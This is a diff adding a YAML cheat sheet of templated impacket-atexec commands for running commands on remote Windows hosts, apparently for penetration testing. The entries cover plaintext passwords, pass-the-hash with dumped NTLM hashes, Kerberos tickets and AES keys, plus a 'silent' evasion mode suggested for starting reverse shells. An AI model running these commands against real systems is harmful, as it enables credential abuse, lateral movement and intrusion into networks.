@@ -1,0 +1,70 @@
+tool: impacket-atexec
+tags: [security, pentest, exploitation, lateral-movement, windows, active-directory, impacket]
+
+actions:
+  # === BASIC EXECUTION ===
+  - title: impacket-atexec - basic command execution
+    desc: |
+      Executes a command on a remote Windows target using the Task Scheduler service (ATSVC).
+      This is a highly effective method for lateral movement when administrative credentials are available.
+      The tool works by creating a scheduled task that runs the command, retrieves the output via a temporary file, and then cleans up after itself.
+      Requires administrative privileges on the target machine.
+    command: "impacket-atexec {{domain|.}}/{{username}}:{{password}}@{{target}} \"{{command|whoami}}\""
+
+  - title: impacket-atexec - authenticate using NTLM hashes
+    desc: |
+      Performs Pass-the-Hash (PtH) to execute commands without needing the plaintext password.
+      This is essential in scenarios where only NTLM hashes have been recovered from memory (LSASS) or the SAM database.
+      The hash must be provided in the format LMHASH:NTHASH.
+      If the LM hash is unknown, use 32 zeros as the prefix (00000000000000000000000000000000:NTHASH).
+    command: "impacket-atexec -hashes {{lm_hash:nt_hash|00000000000000000000000000000000:aad3b435b51404eeaad3b435b51404ee}} {{domain|.}}/{{username}}@{{target}} \"{{command|whoami}}\""
+
+  # === ADVANCED AUTHENTICATION ===
+  - title: impacket-atexec - authenticate using Kerberos
+    desc: |
+      Uses Kerberos tickets for authentication instead of NTLM.
+      This requires a valid Kerberos ticket (TGT) to be present in the environment, usually pointed to by the KRB5CCNAME variable.
+      The -k flag triggers Kerberos usage, and -no-pass tells the tool not to prompt for a password.
+      Ensure that the target is specified as a hostname/FQDN that matches the Service Principal Name (SPN) in the ticket.
+    command: "impacket-atexec -k -no-pass {{domain}}/{{username}}@{{target_fqdn}} \"{{command|whoami}}\""
+
+  - title: impacket-atexec - authenticate using Kerberos AES keys
+    desc: |
+      Uses an AES128 or AES256 hex key for Kerberos authentication.
+      This is useful when you have extracted the account's long-term keys via DCSync or from a NTDS.dit file.
+      Using the -aesKey flag allows authentication without knowing the plaintext password or the NTLM hash.
+      It is often necessary to specify the Domain Controller's IP using -dc-ip when using this method.
+    command: "impacket-atexec -aesKey {{hex_key}} -k -dc-ip {{dc_ip}} {{domain}}/{{username}}@{{target}} \"{{command|whoami}}\""
+
+  # === OPERATIONAL OPTIONS ===
+  - title: impacket-atexec - silent command execution
+    desc: |
+      Executes the specified command directly without wrapping it inside "cmd.exe /c".
+      This can be useful for evasion purposes as it reduces the number of child processes created on the target.
+      Note that when using -silentcommand, the tool will not capture or return any output from the command to your console.
+      This mode is ideal for fire-and-forget tasks like starting a reverse shell or executing a background script.
+    command: "impacket-atexec -silentcommand {{domain|.}}/{{username}}:{{password}}@{{target}} \"{{command|powershell.exe -Enc ...}}\""
+
+  - title: impacket-atexec - execution with timestamps and debug info
+    desc: |
+      Adds timestamps to every line of the logging output, which is helpful for creating audit trails during an engagement.
+      The -debug flag can be added to troubleshoot connection issues or RPC errors.
+      This is recommended when working in unstable network environments or when dealing with complex RPC filtering.
+      It provides a granular view of the Task Scheduler service interaction.
+    command: "impacket-atexec -ts -debug {{domain|.}}/{{username}}:{{password}}@{{target}} \"{{command|hostname}}\""
+
+  - title: impacket-atexec - execute using a specific Domain Controller
+    desc: |
+      Forces the tool to communicate with a specific Domain Controller for authentication purposes.
+      This is particularly useful when the client machine cannot resolve the domain name or is in a different network segment.
+      By specifying -dc-ip, you ensure that the NTLM or Kerberos authentication request is sent to a reachable DC.
+      The target parameter should still point to the intended victim's IP or hostname.
+    command: "impacket-atexec -dc-ip {{dc_ip}} {{domain}}/{{username}}:{{password}}@{{target}} \"{{command|net user /domain}}\""
+
+  - title: impacket-atexec - execution with custom output encoding
+    desc: |
+      Sets the encoding (codec) used to interpret the output returned from the target system.
+      The default is "utf-8", but Windows systems in different locales may use different code pages (e.g., cp1252 or cp437).
+      If the command output appears garbled in your terminal, identify the target's code page and specify it with the -codec flag.
+      This ensures that non-ASCII characters in directory names or user accounts are displayed correctly.
+    command: "impacket-atexec -codec {{encoding|cp1252}} {{domain|.}}/{{username}}:{{password}}@{{target}} \"{{command|dir C:\\Users}}\""
